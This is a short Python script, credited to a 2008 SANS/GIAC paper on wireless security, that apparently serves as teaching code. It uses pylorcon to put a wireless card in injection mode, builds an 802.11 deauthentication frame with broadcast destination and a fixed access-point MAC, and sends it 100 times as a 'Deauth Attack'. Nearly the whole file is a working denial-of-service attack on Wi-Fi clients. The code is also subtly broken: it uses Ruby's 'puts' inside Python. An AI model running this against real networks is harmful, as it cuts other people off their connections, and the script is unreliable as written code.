#!/usr/bin/python

########################################
#
# This code is part of the SANS/GIAC Gold Paper titled
#
# Programming Wireless Security
#
# by Robin Wood (dninja@gmail.com), accepted May 2008
#
# For more information you can find the paper in the "Wireless Access" section of the
# SANS Reading Room at http://www.sans.org/reading_room/ or at www.digininja.org
#
########################################
import sys
import pylorcon

#a = pylorcon.Lorcon("wlan0", "rtl8180")
wifi = pylorcon.Lorcon("ath0", "madwifing")
#a = pylorcon.Lorcon("wlan0", "rtl8180")
#a = pylorcon.Lorcon("eth1", "prism54")
wifi.setfunctionalmode("INJECT");
wifi.setmode("MONITOR");
wifi.setchannel(11);

destination_addr = "\xff\xff\xff\xff\xff\xff";
source_addr = "\x00\x0e\xa6\xce\xe2\x28";
bss_id_addr = "\x00\x0e\xa6\xce\xe2\x28";

# Type/Subtype 0/c0 Management/Deauthentication
packet = '\xc0\x00'
# flags and duration
packet = packet + '\x00\x00'
packet = packet + destination_addr
packet = packet + source_addr
packet = packet + bss_id_addr
# fragment number and sequence number
packet = packet + '\x00\x00'
# Reason code
packet = packet + '\x01\x00'

puts "Deauth Attack\n"

for n in range(100):
        wifi.txpacket (packet);

        print "Done";
